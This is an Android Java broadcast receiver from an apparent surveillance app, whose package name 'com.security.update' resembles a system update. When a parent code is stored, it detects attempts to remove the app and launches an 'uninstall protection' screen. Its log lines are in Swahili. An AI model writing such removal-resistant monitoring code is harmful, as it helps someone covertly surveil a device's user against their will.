package com.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

public class UninstallReceiver extends BroadcastReceiver {
    private static final String TAG = "UninstallReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.intent.action.QUERY_PACKAGE_RESTART")) {
            Log.d(TAG, "⚠️ Mtu anajaribu kufuta app!");
            
            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
            String parentCode = prefs.getString("parent_code", "");
            
            if (!parentCode.isEmpty()) {
                // Anza uninstall protection activity
                Intent protectionIntent = new Intent(context, UninstallProtectionActivity.class);
                protectionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(protectionIntent);
                
                Log.d(TAG, "🔒 Uninstall protection imeshtakiwa");
            }
        }
    }
}
